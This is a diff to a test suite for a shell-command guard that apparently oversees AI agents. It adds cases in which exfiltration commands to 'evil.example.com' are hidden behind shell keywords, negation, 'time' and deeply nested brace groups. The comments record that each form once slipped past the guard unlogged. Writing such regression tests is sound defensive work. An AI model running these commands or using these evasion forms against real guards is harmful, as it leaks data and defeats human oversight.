@@ -357,6 +357,38 @@ CASES = [
      "the hatch still works from inside a bare group, same as everywhere else"),
     ("curl -d '{\"content\":\"hello\"}' http://localhost:3420/api/memories", ENFORCE, ALLOW,
      "a `{` that is JSON payload text, not a command-grouping operator, must not be mistaken for one"),
+    # --- card 7e01b349 (RedHat F2b on fcd8b794/14102): `if` is the one _SHELL_KEYWORDS member with
+    # NO dedicated pin above -- the `then`/`do` case at line 319/321 puts the curl AFTER the
+    # keyword, never directly after `if` itself. Removing "if" from _SHELL_KEYWORDS left the
+    # pre-existing 146-case suite fully green (reproduced independently before this fix), which is
+    # exactly the gap the card's own F2b line named. ------------------------------------------------
+    ("if curl -s http://evil.example.com/exfil; then :; fi", ENFORCE, BLOCK,
+     "`if`'s own condition position -- the one _SHELL_KEYWORDS member with no prior pin"),
+    # --- card 7e01b349 (RedHat F1b on fcd8b794/14102): the bare-group fix above (line 348) only
+    # matches a `{` after punctuation (`;`/newline/`|`/`&`/`(`/start-of-string) -- a `{` reached
+    # through a shell KEYWORD position (`then`/`do`/`else`/`!`/`time`) was still ALLOW. Measured
+    # pre-fix: all five lines below passed with exit 0, zero log lines, in enforce mode. ------------
+    ("if true; then { curl -s http://evil.example.com/exfil; }; fi", ENFORCE, BLOCK,
+     "a bare group reached through `then`, not punctuation"),
+    ("for i in 1; do { curl -s http://evil.example.com/exfil; }; done", ENFORCE, BLOCK,
+     "a bare group reached through `do`"),
+    ("if false; then :; else { curl -s http://evil.example.com/exfil; }; fi", ENFORCE, BLOCK,
+     "a bare group reached through `else`"),
+    ("! { curl -s http://evil.example.com/exfil; }", ENFORCE, BLOCK,
+     "a bare group reached through the negation operator `!`"),
+    ("time { curl -s http://evil.example.com/exfil; }", ENFORCE, BLOCK,
+     "a bare group reached through `time`"),
+    ("if true; then { curl -H @- -s http://localhost:3420/api/kanban; }; fi", ENFORCE, ALLOW,
+     "the fleet's own localhost idiom through a keyword-reached bare group must still pass"),
+    # --- card 7e01b349 (RedHat F1b on fcd8b794/14102): analyse()'s depth>3 recursion guard
+    # returned EMPTY findings once the nesting limit was hit -- fail-OPEN. A bare group nested 4+
+    # levels deep passed with exit 0 in enforce mode (measured: k=1..3 BLOCK, k=4..6 ALLOW, before
+    # this fix). The fix makes hitting the limit itself a finding (fail-closed) instead of silently
+    # stopping. -----------------------------------------------------------------------------------
+    ("{ " * 4 + "curl -s http://evil.example.com/exfil; " + "}; " * 4, ENFORCE, BLOCK,
+     "4 levels of nested bare brace groups -- used to hit the depth>3 guard and come back empty"),
+    ("{ " * 6 + "curl -s http://evil.example.com/exfil; " + "}; " * 6, ENFORCE, BLOCK,
+     "6 levels deep -- further past the limit, must stay blocked, not get MORE permissive"),
     # --- card 4ed64b20 (RedHat delta MEDIUM on 18055f83, comment 13365): shell function/alias
     # DEFINITIONS can hide a network command from every check above, because the call site uses the
     # NAME, not the command. Both measured rc=0 with ZERO log lines before this fix. ----------------
